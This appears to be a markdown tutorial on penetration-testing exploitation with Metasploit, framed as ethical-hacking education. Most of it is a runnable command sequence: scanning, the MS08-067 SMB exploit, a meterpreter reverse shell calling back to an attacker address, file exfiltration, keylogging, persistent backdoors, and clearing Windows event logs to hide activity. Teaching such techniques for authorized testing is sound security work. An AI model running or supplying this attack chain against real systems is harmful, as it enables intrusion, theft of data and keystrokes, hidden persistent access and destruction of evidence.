# Basic Exploitation Techniques

## Introduction
Exploitation is a critical phase in penetration testing where vulnerabilities are leveraged to gain control over a target system. This guide covers fundamental exploitation techniques, including reconnaissance, vulnerability identification, and executing exploits using Metasploit.

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Exploit Selection](#exploit-selection)
- [Payload Deployment](#payload-deployment)
- [Post-Exploitation](#post-exploitation)
- [Maintaining Access](#maintaining-access)
- [Clearing Tracks](#clearing-tracks)
- [Conclusion](#conclusion)

## Reconnaissance
The first step in exploitation is gathering information about the target system. This helps in identifying potential vulnerabilities that can be exploited.

### Passive Reconnaissance
- **WHOIS lookup:** Retrieves domain registration information.
  ```bash
  whois example.com
  ```
- **DNS enumeration:** Finds subdomains and domain records.
  ```bash
  dig example.com axfr
  ```
- **Google dorking:** Uses search engine queries to find sensitive information.
  ```bash
  site:example.com inurl:login
  ```

### Active Reconnaissance
- **Nmap scanning:** Identifies open ports and services.
  ```bash
  nmap -sV -p- 192.168.1.10
  ```
- **Service enumeration:** Gathers information on running services and potential vulnerabilities.
  ```bash
  nmap -sC -sV --script=vuln 192.168.1.10
  ```

## Vulnerability Scanning
Identifying known vulnerabilities in services running on the target system.

- **Nessus Scan:** Commercial scanner with advanced vulnerability detection.
- **OpenVAS:** Open-source alternative for vulnerability assessment.
- **Metasploit Auxiliary Modules:**
  ```bash
  use auxiliary/scanner/http/http_version
  set RHOSTS 192.168.1.10
  run
  ```
  This will scan the HTTP service version on the target.

## Exploit Selection
After identifying vulnerabilities, choose an appropriate exploit from Metasploit.

1. **Search for a vulnerability:**
   ```bash
   search smb
   ```
   This command searches for available SMB exploits.
2. **Select an exploit:**
   ```bash
   use exploit/windows/smb/ms08_067_netapi
   ```
   This selects the infamous SMB exploit for Windows.
3. **Display required options:**
   ```bash
   show options
   ```
   This lists configurable parameters before executing the exploit.

## Payload Deployment
Payloads determine the post-exploitation behavior after a successful exploit.

- **Reverse Shell:** Opens a shell on the target and connects back to the attacker.
  ```bash
  set payload windows/meterpreter/reverse_tcp
  set LHOST 192.168.1.100
  set LPORT 4444
  ```
- **Execute exploit:**
  ```bash
  exploit
  ```
  If successful, this grants a shell on the target system.

## Post-Exploitation
Once the target is compromised, further actions can be performed:

- **Privilege Escalation:** Identifies and exploits privilege escalation vulnerabilities.
  ```bash
  use post/multi/recon/local_exploit_suggester
  set SESSION 1
  run
  ```
- **Data Extraction:** Retrieves sensitive files from the target system.
  ```bash
  download C:\Users\Admin\Documents\sensitive_file.txt
  ```
- **Keylogging:** Captures keystrokes from the compromised machine.
  ```bash
  run post/windows/capture/keylog_recorder
  ```

## Maintaining Access
To retain control over the system:

- **Persistence:** Installs a backdoor to ensure access remains even after reboots.
  ```bash
  run persistence -U -i 5 -p 4444 -r 192.168.1.100
  ```
- **Backdoor Creation:** Automates backdoor persistence.
  ```bash
  use exploit/windows/local/persistence
  ```

## Clearing Tracks
Before leaving a compromised system, it is crucial to remove traces:

- **Clear logs:** Removes Windows event logs to hide malicious activity.
  ```bash
  clearev
  ```
- **Remove artifacts:** Deletes exploit files from the target system.
  ```bash
  rm C:\Windows\Temp\exploit.exe
  ```

## Conclusion
Understanding basic exploitation techniques is essential for ethical hacking and penetration testing. By mastering reconnaissance, vulnerability scanning, exploit execution, and post-exploitation, security professionals can identify and mitigate real-world threats effectively.

_For further reading, refer to the [Metasploit Unleashed Guide](https://www.offensive-security.com/metasploit-unleashed/)._
